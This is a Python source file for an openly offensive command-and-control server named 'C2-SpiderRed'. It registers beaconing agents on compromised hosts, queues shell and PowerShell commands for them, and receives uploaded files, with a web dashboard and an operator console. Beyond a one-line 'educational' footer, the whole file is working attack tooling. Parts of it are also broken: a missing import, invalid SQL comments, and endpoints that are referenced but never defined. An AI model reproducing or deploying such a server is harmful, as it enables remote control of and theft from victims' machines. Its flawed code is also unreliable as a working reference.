#!/usr/bin/env python3
"""
███████╗██████╗ ██╗██████╗ ███████╗██████╗ ██████╗ ███████╗██████╗ 
██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████╗██████╔╝██║██║  ██║█████╗  ██████╔╝██████╔╝█████╗  ██║  ██║
╚════██║██╔═══╝ ██║██║  ██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██║  ██║
███████║██║     ██║██████╔╝███████╗██║  ██║██║  ██║███████╗██████╔╝
╚══════╝╚═╝     ⚪╚═════╝ ╚══════╝╚═╝  ⚪═╝╚═╝  ⚪═╝╚══════╝╚═════╝ 
                
            C2-SpiderRed v2.0 - Advanced Command & Control
            ════════════════════════════════════════════════
"""

import http.server
import socketserver
import json
import base64
import threading
import sqlite3
import os
import time
import hashlib
import random
import string
from datetime import datetime
from queue import Queue, Empty
import select
import socket
import logging
from cryptography.fernet import Fernet
import pickle

# ==================== CONFIGURACIÓN ====================
CONFIG = {
    "PORT": 8443,
    "MASTER_KEY": "SpiderRed_Demo_Key_2024_!@#$%^&*",
    "DB_FILE": "spiderred.db",
    "ENCRYPTION_KEY": Fernet.generate_key(),  # Clave AES para comunicación
    "LOG_FILE": "spiderred.log",
    "SESSION_TIMEOUT": 300,  # 5 minutos
    "MAX_AGENTS": 1000,
    "API_KEY": "".join(random.choices(string.ascii_letters + string.digits, k=32))
}

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG["LOG_FILE"]),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("C2-SpiderRed")

class Encryption:
    """Manejo avanzado de cifrado"""
    
    @staticmethod
    def generate_session_key():
        return Fernet.generate_key()
    
    @staticmethod
    def encrypt_aes(data: str, key: bytes) -> str:
        """Cifrado AES avanzado"""
        f = Fernet(key)
        encrypted = f.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    @staticmethod
    def decrypt_aes(data: str, key: bytes) -> str:
        """Descifrado AES"""
        f = Fernet(key)
        decrypted = f.decrypt(base64.b64decode(data))
        return decrypted.decode()
    
    @staticmethod
    def xor_encrypt(data: str, key: str) -> str:
        """Cifrado XOR adicional para compatibilidad"""
        result = []
        key_bytes = key.encode()
        for i in range(len(data)):
            result.append(chr(ord(data[i]) ^ key_bytes[i % len(key_bytes)]))
        return ''.join(result)

class SpiderRedDatabase:
    """Base de datos avanzada con múltiples tablas"""
    
    def __init__(self):
        self.conn = sqlite3.connect(CONFIG["DB_FILE"], check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # Tabla de agentes
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE,
                hostname TEXT,
                username TEXT,
                os_version TEXT,
                architecture TEXT,
                integrity TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                ip_address TEXT,
                status TEXT DEFAULT 'active',
                session_key TEXT,
                tags TEXT,
                metadata TEXT,
                is_persistent BOOLEAN DEFAULT 0
            )
        ''')
        
        # Tabla de comandos
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                session_id TEXT,
                command_type TEXT,  # shell, powershell, upload, download, script
                command TEXT,
                arguments TEXT,
                issued_at TIMESTAMP,
                completed_at TIMESTAMP,
                status TEXT DEFAULT 'pending',
                result TEXT,
                exit_code INTEGER,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        # Tabla de sesiones interactivas
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                agent_id TEXT,
                session_type TEXT,  # cmd, powershell, meterpreter, ssh
                created_at TIMESTAMP,
                last_activity TIMESTAMP,
                status TEXT DEFAULT 'active',
                encryption_key TEXT,
                buffer TEXT
            )
        ''')
        
        # Tabla de archivos
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                filename TEXT,
                file_path TEXT,
                file_size INTEGER,
                uploaded_at TIMESTAMP,
                content BLOB,
                is_downloaded BOOLEAN DEFAULT 0
            )
        ''')
        
        # Tabla de logs
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                log_type TEXT,
                message TEXT,
                timestamp TIMESTAMP,
                severity TEXT
            )
        ''')
        
        # Tabla de plugins
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS plugins (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT,
                description TEXT,
                author TEXT,
                version TEXT,
                enabled BOOLEAN DEFAULT 1,
                code TEXT
            )
        ''')
        
        self.conn.commit()
        logger.info("Base de datos inicializada")

class InteractiveSession:
    """Sesión interactiva avanzada"""
    
    def __init__(self, session_id, agent_id, session_type="cmd"):
        self.session_id = session_id
        self.agent_id = agent_id
        self.session_type = session_type
        self.command_queue = Queue()
        self.output_buffer = ""
        self.input_buffer = ""
        self.active = True
        self.created_at = datetime.now()
        self.last_activity = datetime.now()
        self.encryption_key = Encryption.generate_session_key()
        self.lock = threading.Lock()
        
        logger.info(f"Sesión creada: {session_id} para agente {agent_id}")
    
    def add_command(self, command_type, command, args=""):
        """Añadir comando a la cola"""
        cmd_id = f"cmd_{int(time.time())}_{random.randint(1000, 9999)}"
        with self.lock:
            self.command_queue.put({
                'id': cmd_id,
                'type': command_type,
                'command': command,
                'args': args,
                'timestamp': datetime.now().isoformat()
            })
        return cmd_id
    
    def get_next_command(self):
        """Obtener siguiente comando"""
        try:
            with self.lock:
                self.last_activity = datetime.now()
                return self.command_queue.get_nowait()
        except Empty:
            return None
    
    def add_output(self, output):
        """Añadir salida al buffer"""
        with self.lock:
            self.output_buffer += output
            self.last_activity = datetime.now()
    
    def get_output(self):
        """Obtener salida y limpiar buffer"""
        with self.lock:
            output = self.output_buffer
            self.output_buffer = ""
            return output
    
    def is_active(self):
        """Verificar si la sesión está activa"""
        timeout = (datetime.now() - self.last_activity).seconds
        return self.active and timeout < CONFIG["SESSION_TIMEOUT"]
    
    def close(self):
        """Cerrar sesión"""
        with self.lock:
            self.active = False
        logger.info(f"Sesión cerrada: {self.session_id}")

class SessionManager:
    """Gestor avanzado de sesiones"""
    
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
    
    def create_session(self, agent_id, session_type="cmd"):
        """Crear nueva sesión"""
        session_id = f"sess_{int(time.time())}_{random.randint(1000, 9999)}"
        
        with self.lock:
            session = InteractiveSession(session_id, agent_id, session_type)
            self.sessions[session_id] = session
        
        logger.info(f"Nueva sesión {session_id} creada para {agent_id}")
        return session_id, session.encryption_key
    
    def get_session(self, session_id):
        """Obtener sesión por ID"""
        return self.sessions.get(session_id)
    
    def close_session(self, session_id):
        """Cerrar sesión"""
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id].close()
                del self.sessions[session_id]
                logger.info(f"Sesión {session_id} cerrada")
    
    def list_sessions(self):
        """Listar todas las sesiones activas"""
        with self.lock:
            active_sessions = []
            for sess_id, session in self.sessions.items():
                if session.is_active():
                    active_sessions.append({
                        'id': sess_id,
                        'agent_id': session.agent_id,
                        'type': session.session_type,
                        'created': session.created_at.isoformat(),
                        'last_activity': session.last_activity.isoformat()
                    })
            return active_sessions

class WebInterface:
    """Interfaz web avanzada"""
    
    @staticmethod
    def generate_dashboard():
        """Generar dashboard HTML"""
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🕷️ C2-SpiderRed Dashboard</title>
            <style>
                :root {
                    --spider-red: #8B0000;
                    --spider-dark: #1a1a1a;
                    --spider-gray: #2d2d2d;
                    --spider-light: #e0e0e0;
                }
                
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                
                body {
                    font-family: 'Consolas', 'Monaco', monospace;
                    background-color: var(--spider-dark);
                    color: var(--spider-light);
                    line-height: 1.6;
                }
                
                .container {
                    max-width: 1400px;
                    margin: 0 auto;
                    padding: 20px;
                }
                
                header {
                    background: linear-gradient(135deg, var(--spider-red), #4a0000);
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 30px;
                    box-shadow: 0 4px 20px rgba(139, 0, 0, 0.3);
                    border: 1px solid rgba(255, 255, 255, 0.1);
                }
                
                .logo {
                    display: flex;
                    align-items: center;
                    gap: 15px;
                    margin-bottom: 10px;
                }
                
                .logo h1 {
                    font-size: 2.5em;
                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
                    background: linear-gradient(45deg, #fff, #ff6b6b);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }
                
                .status-indicator {
                    display: inline-block;
                    width: 12px;
                    height: 12px;
                    border-radius: 50%;
                    margin-right: 8px;
                    animation: pulse 2s infinite;
                }
                
                .status-active { background-color: #00ff00; }
                .status-inactive { background-color: #ff0000; }
                
                @keyframes pulse {
                    0%, 100% { opacity: 1; }
                    50% { opacity: 0.5; }
                }
                
                .dashboard-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 20px;
                    margin-bottom: 30px;
                }
                
                .card {
                    background: var(--spider-gray);
                    border-radius: 10px;
                    padding: 20px;
                    border: 1px solid rgba(255, 255, 255, 0.1);
                    transition: transform 0.3s, box-shadow 0.3s;
                }
                
                .card:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 10px 30px rgba(139, 0, 0, 0.2);
                }
                
                .card h3 {
                    color: var(--spider-red);
                    margin-bottom: 15px;
                    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
                    padding-bottom: 10px;
                }
                
                table {
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 10px;
                }
                
                th, td {
                    padding: 12px;
                    text-align: left;
                    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
                }
                
                th {
                    background-color: rgba(139, 0, 0, 0.2);
                    color: var(--spider-red);
                }
                
                tr:hover {
                    background-color: rgba(255, 255, 255, 0.05);
                }
                
                .terminal {
                    background-color: #000;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    padding: 15px;
                    border-radius: 5px;
                    height: 400px;
                    overflow-y: auto;
                    margin-top: 20px;
                    border: 1px solid var(--spider-red);
                }
                
                .terminal pre {
                    margin: 0;
                    white-space: pre-wrap;
                    word-wrap: break-word;
                }
                
                .btn {
                    background: linear-gradient(135deg, var(--spider-red), #4a0000);
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: all 0.3s;
                    margin: 5px;
                }
                
                .btn:hover {
                    background: linear-gradient(135deg, #4a0000, var(--spider-red));
                    transform: scale(1.05);
                }
                
                .form-group {
                    margin-bottom: 15px;
                }
                
                input, select, textarea {
                    width: 100%;
                    padding: 10px;
                    background: rgba(255, 255, 255, 0.1);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    border-radius: 5px;
                    color: white;
                    margin-top: 5px;
                }
                
                .live-data {
                    font-size: 0.9em;
                    color: #aaa;
                    margin-top: 20px;
                    text-align: center;
                }
                
                footer {
                    text-align: center;
                    margin-top: 40px;
                    padding: 20px;
                    border-top: 1px solid rgba(255, 255, 255, 0.1);
                    color: #666;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <div class="logo">
                        <span class="status-indicator status-active"></span>
                        <h1>🕷️ C2-SpiderRed</h1>
                        <span style="color: #aaa; font-size: 0.9em;">v2.0 - Advanced C2 Framework</span>
                    </div>
                    <p style="color: #ccc;">Advanced Command & Control System - Real-time Agent Management</p>
                </header>
                
                <div class="dashboard-grid">
                    <div class="card">
                        <h3>🖥️ System Overview</h3>
                        <div id="system-stats">
                            <p>Agents Online: <span id="agent-count">0</span></p>
                            <p>Active Sessions: <span id="session-count">0</span></p>
                            <p>Commands Executed: <span id="command-count">0</span></p>
                            <p>Server Uptime: <span id="uptime">00:00:00</span></p>
                        </div>
                    </div>
                    
                    <div class="card">
                        <h3>📊 Quick Actions</h3>
                        <button class="btn" onclick="refreshData()">🔄 Refresh</button>
                        <button class="btn" onclick="scanAgents()">🔍 Scan Network</button>
                        <button class="btn" onclick="showCommandPanel()">💻 Command Shell</button>
                        <button class="btn" onclick="showFileManager()">📁 File Manager</button>
                    </div>
                    
                    <div class="card">
                        <h3>⚠️ Alerts</h3>
                        <div id="alerts-container">
                            <p style="color: #ff6b6b;">No alerts at this time.</p>
                        </div>
                    </div>
                </div>
                
                <div class="card">
                    <h3>👥 Active Agents</h3>
                    <div style="overflow-x: auto;">
                        <table id="agents-table">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Hostname</th>
                                    <th>User</th>
                                    <th>IP Address</th>
                                    <th>OS</th>
                                    <th>Last Seen</th>
                                    <th>Status</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody id="agents-body">
                                <!-- Agents will be loaded here -->
                            </tbody>
                        </table>
                    </div>
                </div>
                
                <div class="card">
                    <h3>💬 Interactive Terminal</h3>
                    <div class="form-group">
                        <select id="agent-select" style="width: 200px;">
                            <option value="">Select Agent</option>
                        </select>
                        <select id="command-type" style="width: 150px;">
                            <option value="cmd">CMD</option>
                            <option value="powershell">PowerShell</option>
                            <option value="bash">Bash</option>
                        </select>
                    </div>
                    <div class="terminal">
                        <pre id="terminal-output">C2-SpiderRed Terminal Ready...</pre>
                    </div>
                    <div class="form-group" style="margin-top: 15px;">
                        <input type="text" id="command-input" placeholder="Enter command..." 
                               onkeypress="if(event.key === 'Enter') sendCommand()">
                        <button class="btn" onclick="sendCommand()">Execute</button>
                        <button class="btn" onclick="clearTerminal()">Clear</button>
                    </div>
                </div>
                
                <div class="live-data">
                    <p>🔄 Live Data Updates | Last Refresh: <span id="last-refresh">--:--:--</span></p>
                </div>
                
                <footer>
                    <p>C2-SpiderRed Framework © 2024 | For Educational Purposes Only</p>
                    <p style="font-size: 0.8em; color: #444;">Connection Encrypted | Session Secured</p>
                </footer>
            </div>
            
            <script>
                let agents = [];
                let selectedAgent = '';
                let terminalHistory = [];
                
                function formatTime(date) {
                    return date.toLocaleTimeString();
                }
                
                function updateUptime() {
                    const startTime = new Date();
                    setInterval(() => {
                        const now = new Date();
                        const diff = now - startTime;
                        const hours = Math.floor(diff / 3600000);
                        const minutes = Math.floor((diff % 3600000) / 60000);
                        const seconds = Math.floor((diff % 60000) / 1000);
                        document.getElementById('uptime').textContent = 
                            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                    }, 1000);
                }
                
                async function fetchAgents() {
                    try {
                        const response = await fetch('/api/agents');
                        agents = await response.json();
                        updateAgentsTable();
                        updateAgentSelect();
                        updateCounts();
                        document.getElementById('last-refresh').textContent = formatTime(new Date());
                    } catch (error) {
                        console.error('Error fetching agents:', error);
                    }
                }
                
                function updateAgentsTable() {
                    const tbody = document.getElementById('agents-body');
                    tbody.innerHTML = '';
                    
                    agents.forEach(agent => {
                        const row = document.createElement('tr');
                        const lastSeen = new Date(agent.last_seen);
                        const now = new Date();
                        const diffMinutes = Math.floor((now - lastSeen) / 60000);
                        const status = diffMinutes < 5 ? '🟢 Online' : '🔴 Offline';
                        
                        row.innerHTML = `
                            <td>${agent.agent_id}</td>
                            <td>${agent.hostname}</td>
                            <td>${agent.username}</td>
                            <td>${agent.ip_address}</td>
                            <td>${agent.os_version}</td>
                            <td>${lastSeen.toLocaleString()}</td>
                            <td>${status}</td>
                            <td>
                                <button class="btn" onclick="selectAgent('${agent.agent_id}')" 
                                        style="padding: 5px 10px; font-size: 0.8em;">
                                    Select
                                </button>
                            </td>
                        `;
                        tbody.appendChild(row);
                    });
                }
                
                function updateAgentSelect() {
                    const select = document.getElementById('agent-select');
                    select.innerHTML = '<option value="">Select Agent</option>';
                    
                    agents.forEach(agent => {
                        const option = document.createElement('option');
                        option.value = agent.agent_id;
                        option.textContent = `${agent.hostname} (${agent.agent_id})`;
                        select.appendChild(option);
                    });
                }
                
                function updateCounts() {
                    document.getElementById('agent-count').textContent = agents.length;
                    // These would need actual API endpoints
                    document.getElementById('session-count').textContent = '0';
                    document.getElementById('command-count').textContent = '0';
                }
                
                function selectAgent(agentId) {
                    selectedAgent = agentId;
                    document.getElementById('agent-select').value = agentId;
                    addToTerminal(`\n> Selected agent: ${agentId}\n`);
                }
                
                function addToTerminal(text) {
                    const output = document.getElementById('terminal-output');
                    terminalHistory.push(text);
                    output.textContent += text;
                    output.scrollTop = output.scrollHeight;
                }
                
                async function sendCommand() {
                    if (!selectedAgent) {
                        addToTerminal('\n> Error: No agent selected\n');
                        return;
                    }
                    
                    const commandInput = document.getElementById('command-input');
                    const commandType = document.getElementById('command-type').value;
                    const command = commandInput.value.trim();
                    
                    if (!command) return;
                    
                    addToTerminal(`\n[${selectedAgent}] $ ${command}\n`);
                    
                    try {
                        const response = await fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                agent_id: selectedAgent,
                                command_type: commandType,
                                command: command
                            })
                        });
                        
                        const result = await response.json();
                        if (result.success) {
                            setTimeout(() => fetchCommandResult(result.task_id), 2000);
                        }
                    } catch (error) {
                        addToTerminal(`\n> Error: ${error.message}\n`);
                    }
                    
                    commandInput.value = '';
                }
                
                async function fetchCommandResult(taskId) {
                    try {
                        const response = await fetch(`/api/result/${taskId}`);
                        const result = await response.json();
                        addToTerminal(result.output + '\n');
                    } catch (error) {
                        console.error('Error fetching result:', error);
                    }
                }
                
                function clearTerminal() {
                    document.getElementById('terminal-output').textContent = 'C2-SpiderRed Terminal Ready...\n';
                    terminalHistory = [];
                }
                
                function refreshData() {
                    addToTerminal('\n> Refreshing data...\n');
                    fetchAgents();
                }
                
                function scanAgents() {
                    addToTerminal('\n> Scanning network for agents...\n');
                    // This would call a backend endpoint
                }
                
                function showCommandPanel() {
                    addToTerminal('\n> Opening advanced command panel...\n');
                }
                
                function showFileManager() {
                    addToTerminal('\n> Opening file manager...\n');
                }
                
                // Initialize
                document.addEventListener('DOMContentLoaded', () => {
                    updateUptime();
                    fetchAgents();
                    setInterval(fetchAgents, 10000); // Refresh every 10 seconds
                });
            </script>
        </body>
        </html>
        """

class SpiderRedHandler(http.server.BaseHTTPRequestHandler):
    """Manejador principal del C2"""
    
    def __init__(self, *args, **kwargs):
        self.db = SpiderRedDatabase()
        self.session_manager = SessionManager()
        self.encryption = Encryption()
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        logger.info(f"{self.client_address[0]} - {format % args}")
    
    def do_GET(self):
        """Manejar peticiones GET"""
        try:
            if self.path == '/':
                # Dashboard principal
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(WebInterface.generate_dashboard().encode())
            
            elif self.path.startswith('/api/'):
                # API endpoints
                self.handle_api_request()
            
            elif self.path == '/status':
                # Status endpoint
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                response = {
                    "status": "online",
                    "version": "2.0",
                    "agents": len(self.get_active_agents()),
                    "sessions": len(self.session_manager.list_sessions()),
                    "timestamp": datetime.now().isoformat()
                }
                self.wfile.write(json.dumps(response).encode())
            
            else:
                self.send_error(404, "Not Found")
                
        except Exception as e:
            logger.error(f"Error en GET {self.path}: {e}")
            self.send_error(500, "Internal Server Error")
    
    def do_POST(self):
        """Manejar peticiones POST del agente"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            if not post_data:
                self.send_error(400, "No data")
                return
            
            # Procesar según el endpoint
            if self.path == '/beacon':
                self.handle_beacon(post_data)
            elif self.path == '/command':
                self.handle_command_request(post_data)
            elif self.path == '/upload':
                self.handle_file_upload(post_data)
            else:
                self.send_error(404, "Not Found")
                
        except Exception as e:
            logger.error(f"Error en POST {self.path}: {e}")
            self.send_error(500, "Internal Server Error")
    
    def handle_beacon(self, data):
        """Manejar beacon de agente"""
        try:
            # Descifrar datos
            decrypted = self.encryption.decrypt_aes(
                data.decode(),
                CONFIG["ENCRYPTION_KEY"]
            )
            beacon_data = json.loads(decrypted)
            
            agent_id = beacon_data.get('agent_id')
            client_ip = self.client_address[0]
            
            logger.info(f"Beacon recibido de {agent_id} desde {client_ip}")
            
            # Registrar/Actualizar agente
            self.register_agent(agent_id, beacon_data, client_ip)
            
            # Obtener comandos pendientes
            pending_commands = self.get_pending_commands(agent_id)
            
            # Preparar respuesta
            response = {
                "status": "success",
                "agent_id": agent_id,
                "commands": pending_commands,
                "timestamp": datetime.now().isoformat(),
                "sleep": random.randint(30, 120)  # Jitter
            }
            
            # Enviar respuesta cifrada
            encrypted_response = self.encryption.encrypt_aes(
                json.dumps(response),
                CONFIG["ENCRYPTION_KEY"]
            )
            
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            self.wfile.write(encrypted_response.encode())
            
        except Exception as e:
            logger.error(f"Error procesando beacon: {e}")
            self.send_error(500, "Beacon processing error")
    
    def handle_api_request(self):
        """Manejar peticiones API"""
        try:
            if self.path == '/api/agents':
                agents = self.get_active_agents()
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(agents).encode())
            
            elif self.path.startswith('/api/command'):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                command_data = json.loads(post_data.decode())
                
                task_id = self.create_command(
                    command_data['agent_id'],
                    command_data['command_type'],
                    command_data['command']
                )
                
                response = {"success": True, "task_id": task_id}
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())
            
            else:
                self.send_error(404, "API endpoint not found")
                
        except Exception as e:
            logger.error(f"Error en API request: {e}")
            self.send_error(500, "API error")
    
    def register_agent(self, agent_id, data, ip_address):
        """Registrar o actualizar agente"""
        cursor = self.db.conn.cursor()
        now = datetime.now().isoformat()
        
        cursor.execute('''
            INSERT OR REPLACE INTO agents 
            (agent_id, hostname, username, os_version, architecture, 
             integrity, first_seen, last_seen, ip_address, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            agent_id,
            data.get('hostname', 'Unknown'),
            data.get('username', 'Unknown'),
            data.get('os_version', 'Unknown'),
            data.get('architecture', 'Unknown'),
            data.get('integrity', 'Unknown'),
            now,
            now,
            ip_address,
            json.dumps(data)
        ))
        
        self.db.conn.commit()
        logger.info(f"Agente {agent_id} registrado/actualizado")
    
    def get_active_agents(self):
        """Obtener agentes activos"""
        cursor = self.db.conn.cursor()
        cursor.execute('''
            SELECT agent_id, hostname, username, os_version, architecture,
                   integrity, last_seen, ip_address
            FROM agents 
            WHERE status = 'active'
            ORDER BY last_seen DESC
        ''')
        
        agents = []
        for row in cursor.fetchall():
            agents.append(dict(row))
        
        return agents
    
    def get_pending_commands(self, agent_id):
        """Obtener comandos pendientes para un agente"""
        cursor = self.db.conn.cursor()
        cursor.execute('''
            SELECT id, command_type, command, arguments
            FROM commands 
            WHERE agent_id = ? AND status = 'pending'
            ORDER BY issued_at ASC
        ''', (agent_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'type': row['command_type'],
                'command': row['command'],
                'args': row['arguments']
            })
        
        return commands
    
    def create_command(self, agent_id, command_type, command, args=""):
        """Crear nuevo comando"""
        cursor = self.db.conn.cursor()
        now = datetime.now().isoformat()
        
        cursor.execute('''
            INSERT INTO commands 
            (agent_id, command_type, command, arguments, issued_at, status)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (agent_id, command_type, command, args, now, 'pending'))
        
        self.db.conn.commit()
        return cursor.lastrowid

class AdminCLI(cmd.Cmd):
    """CLI avanzada para operadores"""
    
    prompt = '🕷️ C2-SpiderRed> '
    intro = '''
    ╔═══════════════════════════════════════════════════════════════╗
    ║                🕷️ C2-SpiderRed Admin Console                 ║
    ║            Advanced Command & Control Framework               ║
    ╚═══════════════════════════════════════════════════════════════╝
    
    Type 'help' or '?' for available commands.
    '''
    
    def __init__(self, db, session_manager):
        super().__init__()
        self.db = db
        self.session_manager = session_manager
    
    def do_agents(self, arg):
        """List all registered agents"""
        cursor = self.db.conn.cursor()
        cursor.execute('SELECT * FROM agents ORDER BY last_seen DESC')
        
        print(f"\n{'ID':<30} {'Hostname':<15} {'User':<15} {'IP':<15} {'Last Seen':<20}")
        print("-"*100)
        
        for row in cursor.fetchall():
            last_seen = datetime.fromisoformat(row['last_seen'])
            now = datetime.now()
            diff = (now - last_seen).seconds
            status = "🟢" if diff < 300 else "🔴"
            
            print(f"{status} {row['agent_id']:<28} {row['hostname']:<15} "
                  f"{row['username']:<15} {row['ip_address']:<15} {last_seen.strftime('%Y-%m-%d %H:%M:%S'):<20}")
    
    def do_sessions(self, arg):
        """List active interactive sessions"""
        sessions = self.session_manager.list_sessions()
        
        if not sessions:
            print("\nNo active sessions")
            return
        
        print(f"\n{'Session ID':<20} {'Agent ID':<30} {'Type':<10} {'Created':<20}")
        print("-"*85)
        
        for session in sessions:
            print(f"{session['id']:<20} {session['agent_id']:<30} "
                  f"{session['type']:<10} {session['created']:<20}")
    
    def do_exec(self, arg):
        """Execute command on agent: exec <agent_id> <command>"""
        if not arg:
            print("Usage: exec <agent_id> <command>")
            return
        
        args = arg.split(maxsplit=1)
        if len(args) < 2:
            print("Usage: exec <agent_id> <command>")
            return
        
        agent_id, command = args
        cursor = self.db.conn.cursor()
        
        # Crear comando
        cursor.execute('''
            INSERT INTO commands (agent_id, command_type, command, issued_at, status)
            VALUES (?, 'shell', ?, ?, ?)
        ''', (agent_id, command, datetime.now().isoformat(), 'pending'))
        
        self.db.conn.commit()
        print(f"\n[+] Command queued for agent {agent_id}")
        print(f"[+] Task ID: {cursor.lastrowid}")
    
    def do_interactive(self, arg):
        """Start interactive session with agent: interactive <agent_id>"""
        if not arg:
            print("Usage: interactive <agent_id>")
            return
        
        agent_id = arg.strip()
        session_id, key = self.session_manager.create_session(agent_id)
        
        print(f"\n[+] Interactive session started")
        print(f"[+] Session ID: {session_id}")
        print(f"[+] Encryption Key: {key.hex()[:16]}...")
        print(f"\nType 'exit' to leave the session")
        
        # Aquí iría la lógica de sesión interactiva completa
        # con entrada/salida en tiempo real
    
    def do_scan(self, arg):
        """Scan for agents on network: scan <network>"""
        network = arg or "192.168.1.0/24"
        print(f"\n[+] Scanning network {network} for agents...")
        # Aquí iría la lógica de escaneo real
    
    def do_plugins(self, arg):
        """List or manage plugins"""
        cursor = self.db.conn.cursor()
        cursor.execute('SELECT * FROM plugins WHERE enabled = 1')
        
        print("\n🛠️  Active Plugins:")
        print("-"*50)
        
        for row in cursor.fetchall():
            print(f"\n{row['name']} v{row['version']}")
            print(f"Author: {row['author']}")
            print(f"Description: {row['description']}")
    
    def do_exit(self, arg):
        """Exit the C2 console"""
        print("\n[+] Shutting down C2-SpiderRed...")
        return True
    
    def do_clear(self, arg):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

def start_admin_console(db, session_manager):
    """Iniciar consola de administración"""
    cli = AdminCLI(db, session_manager)
    cli.cmdloop()

def main():
    """Función principal"""
    print(r"""
     _____ _____    _____     _     _____ ______ 
    /  ___/  ___|  / __  \   | |   |  _  \|  ___|
    \ `--.\ `--.   `' / /'   | |   | | | || |__  
     `--. \`--. \    / /     | |   | | | ||  __| 
    /\__/ /\__/ /  ./ /___   | |___| |/ / | |___ 
    \____/\____/   \_____/   \_____/___/  \____/ 
    
    ═══════════════════════════════════════════════
    Advanced Command & Control Framework v2.0
    ═══════════════════════════════════════════════
    """)
    
    # Inicializar componentes
    db = SpiderRedDatabase()
    session_manager = SessionManager()
    
    # Iniciar consola de administración en hilo separado
    admin_thread = threading.Thread(
        target=start_admin_console,
        args=(db, session_manager),
        daemon=True
    )
    admin_thread.start()
    
    # Configurar y arrancar servidor HTTP
    handler = lambda *args, **kwargs: SpiderRedHandler(*args, **kwargs)
    
    with socketserver.TCPServer(("0.0.0.0", CONFIG["PORT"]), handler) as httpd:
        print(f"\n[🕷️] C2-SpiderRed iniciado en puerto {CONFIG['PORT']}")
        print(f"[🔑] API Key: {CONFIG['API_KEY']}")
        print(f"[🌐] Dashboard: http://localhost:{CONFIG['PORT']}")
        print(f"[📊] Web Interface: http://localhost:{CONFIG['PORT']}/dashboard")
        print(f"[📁] Database: {CONFIG['DB_FILE']}")
        print(f"[📝] Logs: {CONFIG['LOG_FILE']}")
        print(f"\n[⚡] Sistema listo. Usa la consola de administración para operar.")
        print("="*60 + "\n")
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Servidor detenido por el usuario")
            httpd.server_close()

if __name__ == "__main__":
    main()
